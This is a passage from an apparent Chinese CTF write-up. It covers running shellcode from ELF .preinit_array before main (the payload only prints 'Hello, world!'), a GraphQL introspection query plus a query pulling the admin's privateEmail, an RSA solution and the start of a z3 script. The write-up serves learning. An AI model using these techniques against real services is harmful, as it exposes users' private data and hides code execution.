i;</span><br><span class="line">    </span><br><span class="line">    count = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="keyword">for</span> (i = count - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        __fini_array_start[i]();</span><br><span class="line">    </span><br><span class="line">    _fini();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现<code>__preinit_array_start</code>中的函数指针会在初始化的时候被调用，那么接下来就是将我们的函数指针放进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((section(<span class="string">&quot;.preinit_array&quot;</span>), used)) <span class="function"><span class="keyword">static</span> <span class="title">typeof</span><span class="params">(print)</span> *preinit_p </span>= (<span class="keyword">char</span> *)print;</span><br></pre></td></tr></table></figure><p>然后就是写个汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x4</span><br><span class="line">    xor ebx, ebx</span><br><span class="line">    mov bl, 0x1</span><br><span class="line"></span><br><span class="line">    xor edx, edx</span><br><span class="line">    push edx</span><br><span class="line"></span><br><span class="line">    push 0x21</span><br><span class="line">    ; &quot;dlro&quot;</span><br><span class="line">    push 0x646c726f</span><br><span class="line">    ; &quot;w ,o&quot;</span><br><span class="line">    push 0x77202C6f</span><br><span class="line">    ; &quot;lleH&quot;</span><br><span class="line">    push 0x6c6c6548</span><br><span class="line"></span><br><span class="line">    mov ecx, esp</span><br><span class="line">    mov dl, 13</span><br><span class="line">    int 0x80                ; print Hello, world!</span><br><span class="line"></span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov al, 0x1</span><br><span class="line">    xor ebx, ebx</span><br><span class="line"></span><br><span class="line">    int 0x80                ; exit</span><br></pre></td></tr></table></figure><p>编译一下，然后dump出Hex</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./print | grep &#x27;[0-9a-f]:&#x27; | grep -v &#x27;file&#x27;|cut -f2 -d:|cut -f1-6 -d&#x27; &#x27;|tr -s &#x27; &#x27;|tr &#x27;\t&#x27; &#x27; &#x27;|sed &#x27;s/ $//g&#x27;|sed &#x27;s/ /\\x/g&#x27;|paste -d &#x27;&#x27; -s | sed &#x27;s/^/&quot;/&#x27;|sed &#x27;s/$/&quot;/g&#x27;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__attribute__ ((section (<span class="string">&quot;.init&quot;</span>))) <span class="keyword">char</span> print[] = <span class="string">&quot;\x31\xc0\xb0\x04\x31\xdb\xb3\x01\x31\xd2\x52\x6a\x21\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x48\x65\x6c\x6c\x89\xe1\xb2\x0d\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80&quot;</span>;</span><br><span class="line">__attribute__((section(<span class="string">&quot;.preinit_array&quot;</span>), used)) <span class="function"><span class="keyword">static</span> <span class="title">typeof</span><span class="params">(print)</span> *preinit_p </span>= (<span class="keyword">char</span> *)print;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="图之上的信息">图之上的信息</h2><p>（开始的时候懒得看文档的，毕竟#摆烂）查看文档可以发现GraphQL的Introspection操作</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">`&#123;</span></span><br><span class="line"><span class="string">  __schema &#123;</span></span><br><span class="line"><span class="string">    types &#123;</span></span><br><span class="line"><span class="string">      name</span></span><br><span class="line"><span class="string">      fields &#123;</span></span><br><span class="line"><span class="string">        name</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;`</span></span><br><span class="line">axios.post(<span class="string">&quot;/graphql&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">query</span>: query</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>查看返回结果</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;data&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;__schema&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;types&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Query&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;note&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get a specific note information&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;notes&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get notes information of a user&quot;</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;Get a specific user information&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GNote&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;contents&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Int&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: <span class="literal">null</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;String&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: <span class="literal">null</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GUser&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;fields&quot;</span>: [</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;privateEmail&quot;</span>,</span><br><span class="line">                            <span class="attr">&quot;description&quot;</span>: <span class="literal">null</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    ]</span><br><span class="line">                &#125;,</span><br><span class="line">        <span class="comment">// .........</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这下就很清晰了，我们要查询邮箱，只需要查询<code>user</code>的<code>privateEmail</code>，然后照着文档写，猜测admin就是id为1的用户</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">`&#123;</span></span><br><span class="line"><span class="string">  user(id: 1) &#123;</span></span><br><span class="line"><span class="string">    id</span></span><br><span class="line"><span class="string">    username</span></span><br><span class="line"><span class="string">    privateEmail</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;`</span>;</span><br></pre></td></tr></table></figure><p>即可得到flag</p><h2 id="Easy-RSA">Easy RSA</h2><p>我们需要解出<code>p, q</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p</span>():</span></span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class="comment"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class="line">    <span class="keyword">return</span> value_p</span><br></pre></td></tr></table></figure><p>注意到x是一个质数，根据Willson定理有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">!</mo><mtext> </mtext><mo>≡</mo><mtext> </mtext><mo>−</mo><mn>1</mn><mtext> mod </mtext><mi>x</mi></mrow><annotation encoding="application/x-tex">(x-1)!\ \equiv\ -1\ \text{mod}\ x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)!</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">x</span></span></span></span>，也即是</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>y</mi><mo stretchy="false">!</mo><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⋯</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mtext> </mtext><mo>≡</mo><mtext> </mtext><mn>1</mn><mtext> mod </mtext><mi>x</mi></mrow><annotation encoding="application/x-tex">y!(-1)(y+1)\cdots(x-1)\ \equiv\ 1\ \text{mod}\ x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">!</span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">x</span></span></span></span></span></p><p>只要求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⋯</mo><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(-1)(y+1)\cdots(x-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>的逆元即可</p><p>然后是q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">value = [getPrime(<span class="number">256</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    value.append(sympy.nextprime(value[i - <span class="number">1</span>]))</span><br><span class="line"><span class="comment"># print(&quot;value[-1] = &quot;, value[-1])</span></span><br><span class="line"><span class="comment"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    n = n * value[i]</span><br></pre></td></tr></table></figure><p>根据已有信息可以倒退得到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，求解方程</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>q</mi><mi>e</mi></msup><mo>≡</mo><mtext> value_q mod </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">q^e \equiv\ \text{value\_q}\ \text{mod}\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9088em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord text"><span class="mord">value_q</span></span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span></span></p><p>即可，注意到这个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>是很多个质数的乘积，那么它的欧拉函数值<br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">Π</mi><mtext> </mtext><mi>ϕ</mi><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)=\Pi\, \phi(p_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Π</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>并且有如下条件成立</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mtext>value_q</mtext><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow><annotation encoding="application/x-tex">\begin{cases}    (\text{value\_q}, n) = 1\\    (e, \phi(n)) = 1\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mord text"><span class="mord">value_q</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">))</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>那么结果是好求的，只要用扩展欧几里得求到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">u</span></span></span></span>，使得</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mi>u</mi><mo>+</mo><mi>v</mi><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">eu+v\phi(n)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">u</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p>然后就可以得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>=</mo><msup><mtext>value_q</mtext><mi>u</mi></msup><mtext> mod </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">q = \text{value\_q}^u\ \text{mod}\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0587em;vertical-align:-0.31em;"></span><span class="mord"><span class="mord text"><span class="mord">value_q</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7487em;"><span style="top:-3.1473em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">u</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span></p><p><s>接下来就靠着Copilot一顿写就好了！</s></p><h2 id="赛博厨房">赛博厨房</h2><p>这个前两个问题只要看懂题目在说什么，问题不大</p><h2 id="灯，等灯等灯">灯，等灯等灯</h2><h3 id="Level1">Level1</h3><p>是一个很大的同余方程组（然而当时看着题目好复杂的样子就直接开摆了）其实并不困难，现在想起来丢给数学工具大概就完事了罢！这里用z3求解器来解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">result = [</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">33</span>, <span class="number">33</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">189</span>, <span class="number">189</span>, <span 